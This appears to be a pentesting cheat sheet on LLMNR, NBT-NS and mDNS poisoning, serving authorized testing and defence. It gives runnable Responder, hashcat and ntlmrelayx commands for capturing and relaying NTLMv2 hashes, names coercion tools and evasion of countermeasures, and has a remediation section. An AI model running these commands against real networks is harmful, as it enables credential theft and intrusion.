# LLMNR / NBT-NS / mDNS Poisoning (Responder)

> Spoof Windows name-resolution broadcasts and capture NTLMv2 hashes from clients that mistype hostnames. Authorized testing only. Map: MITRE ATT&CK T1557.001.

## TL;DR
- Windows clients fall back from DNS → LLMNR (UDP 5355) → NBT-NS (UDP 137) → mDNS (UDP 5353) when a name doesn't resolve.
- Attacker on the same broadcast domain answers "yes, I'm `printer-corp` / `wpad` / typo" → victim sends NTLM auth → attacker captures NTLMv2 hash → offline crack OR relay (see [../ad-infrastructure/lateral-movement.md](../ad-infrastructure/lateral-movement.md)).
- Tool: **Responder** (Linux) / **Inveigh** (Windows, [../post-exploitation/powershell-offensive.md](../post-exploitation/powershell-offensive.md)).
- Defence: disable LLMNR, NBT-NS, mDNS at GPO; SMB signing required; LDAP signing + channel binding.

## Detection / Discovery

### Are these protocols on the wire?
```bash
# Capture 30 seconds of multicast traffic on the local segment
sudo tcpdump -ni eth0 -c 100 'udp port 5355 or udp port 137 or udp port 5353'
# If LLMNR queries appear -> LLMNR is enabled on at least one host.
```

### Responder analysis mode
```bash
# Read-only mode — passively logs queries, doesn't answer
sudo responder -I eth0 -A
```

## Exploitation

### Responder default — answer everything
```bash
sudo responder -I eth0 -rdwv
# -r  enable answers for NetBIOS workstation service
# -d  enable answers for NetBIOS domain service
# -w  start the WPAD proxy server
# -v  verbose

# Capture goes to /usr/share/responder/logs/ — Responder-Session.log + per-host NTLMv2-SSP-*.txt
```

Hashcat / john consumes the per-host files directly:
```bash
hashcat -m 5600 ntlmv2-hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt ntlmv2-hash.txt
```

### Relay instead of crack — `ntlmrelayx.py`
If the captured hash is from a user who has admin rights on another host with SMB-signing-not-required, relay it:
```bash
# Targets list — internal hosts where the victim has admin rights
echo -e 'smb://10.0.0.10\nsmb://10.0.0.11' > targets.txt

# Run responder with SMB/HTTP turned OFF (handing those to ntlmrelayx)
# /etc/responder/Responder.conf: SMB = Off, HTTP = Off
sudo responder -I eth0 -rdv

# Run ntlmrelayx
sudo ntlmrelayx.py -tf targets.txt -smb2support
# When a victim auths to Responder, Responder hands off to ntlmrelayx which
# completes the auth against the target and runs --command (default: dump SAM)
```

Coercion to multiply hits:
- `PetitPotam.py` → coerces SMB auth from a target's machine account to your listener.
- `printerbug.py` / `SpoolSample` → forces Print Spooler RPC auth.
- `DFSCoerce.py` → DFS coercion.
- `coercer` (combined tool): https://github.com/p0dalirius/Coercer.

### mDNS — Apple / Linux name resolution
Same idea, port 5353 (`_workstation._tcp.local`, `_smb._tcp.local`). Responder `-m` enables mDNS poisoning.

## Bypasses (defender countermeasures and how attackers adapt)
- LLMNR disabled at GPO but NBT-NS still on → attack via NBT-NS only (some orgs miss it).
- All three disabled but switch-side mitigation absent → ARP spoofing to MITM normal DNS responses (see [./arp-dns-spoofing.md](./arp-dns-spoofing.md)).
- SMB signing required → can't relay to SMB; relay to LDAP / HTTP (web admin panels) instead. `ntlmrelayx.py -t ldap://dc.target.tld -i` for interactive.

## Defence / Remediation
- **Disable LLMNR** via GPO: Computer Configuration → Administrative Templates → Network → DNS Client → "Turn off multicast name resolution" = Enabled.
- **Disable NBT-NS** per-interface via DHCP option 044 (NBNS) + per-host `Set-NetIPInterface -InterfaceAlias <name> -ChannelAccessConfiguration ...` or registry `NetbiosOptions = 2` on every interface (HKLM\SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces\Tcpip_*).
- **Disable mDNS** on Windows 10 22H2+ (`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters EnableMDNS=0`) for hosts that don't need it.
- **SMB signing required** on every endpoint (`Microsoft network client: Digitally sign communications (always)` = Enabled). Defeats SMB relay.
- **LDAP signing + channel binding required** on DCs (event 2887/2889 audits first). Defeats LDAP relay.
- **EPA** (Extended Protection for Authentication) on AD CS web enrollment (mitigates ESC8) and Exchange OWA.
- **Audit policy**: 4624 type 3 (network logon), 4625 (failures), 5145 (file share access) shipped to SIEM.
- **Network segmentation** so workstations and servers aren't on the same broadcast domain — limits LLMNR/NBT-NS surface.

## Sources
- Responder: https://github.com/lgandx/Responder
- Inveigh (PowerShell + C# variants): https://github.com/Kevin-Robertson/Inveigh
- Impacket ntlmrelayx: https://github.com/fortra/impacket
- Coercer (multiple coercion methods in one tool): https://github.com/p0dalirius/Coercer
- PetitPotam: https://github.com/topotam/PetitPotam
- DFSCoerce: https://github.com/Wh04m1001/DFSCoerce
- Black Hills Information Security — How To Disable LLMNR & Why You Want To: https://www.blackhillsinfosec.com/how-to-disable-llmnr-why-you-want-to/
- Microsoft — Disable LLMNR via Group Policy: Computer Configuration → Administrative Templates → Network → DNS Client → "Turn off Multicast Name Resolution" (Enabled)
- HackTricks Responder: https://book.hacktricks.wiki/en/network-services-pentesting/spoofing-llmnr-nbtns-mdns-dns-and-wpad-and-relay-attacks.html
- MITRE ATT&CK T1557.001 LLMNR/NBT-NS Poisoning and SMB Relay: https://attack.mitre.org/techniques/T1557/001/
